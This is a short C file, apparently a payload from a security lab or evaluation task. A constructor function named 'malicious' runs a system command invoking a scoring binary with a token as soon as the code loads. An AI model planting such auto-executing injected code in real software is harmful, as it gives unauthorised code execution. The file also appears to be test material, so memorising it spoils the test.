#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 9c8b1e34-e35f-44bf-8913-e5ccf82e16d6");
}
